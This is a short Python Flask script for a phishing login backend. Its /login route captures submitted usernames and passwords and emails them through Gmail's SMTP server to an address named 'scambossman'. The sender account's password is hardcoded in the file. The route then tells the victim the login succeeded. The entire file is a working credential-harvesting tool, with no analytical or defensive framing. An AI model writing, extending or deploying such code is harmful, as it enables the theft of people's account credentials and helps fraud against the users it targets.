
from flask import Flask, request
import smtplib
from email.message import EmailMessage

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
	username = request.form['username']
	password = request.form['password']
	
	# Send login credentials to email
	msg = EmailMessage()
	msg.set_content(f"Username: {username}\nPassword: {password}")
	msg["Subject"] = "Login Credentials"
	msg["From"] = "scambossman@gmail.com"
	msg["To"] = "scambossman@gmail.com"
	
	with smtplib.SMTP("smtp.gmail.com", 587) as server:
		server.starttls()
		server.login("scambossman@gmail.com", "SYTerrywhite@13")
		server.send_message(msg)
		server.quit()
	
	return "Login successful!"

if __name__ == '__main__':
	app.run()
   
